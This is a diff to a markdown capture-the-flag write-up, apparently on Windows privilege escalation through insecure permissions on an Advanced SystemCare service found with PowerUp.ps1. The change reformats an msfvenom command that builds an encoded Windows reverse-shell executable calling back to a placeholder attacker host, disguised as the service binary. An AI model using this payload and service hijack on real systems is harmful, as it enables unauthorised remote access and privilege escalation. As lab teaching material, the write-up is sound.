@@ -40,7 +40,9 @@ An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` pe
 `PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but we will focus on the insecure service permissions one.
 
 What we need now is to exit from the powershell instance `CTRL+C` and enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
-`msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+```
 ![](https://github.com/user-attachments/assets/e11027f6-b3db-47f2-b603-4ec01efbcd2e)
 
 ![](https://github.com/user-attachments/assets/5f701340-d0eb-42cc-8190-32116130314c)
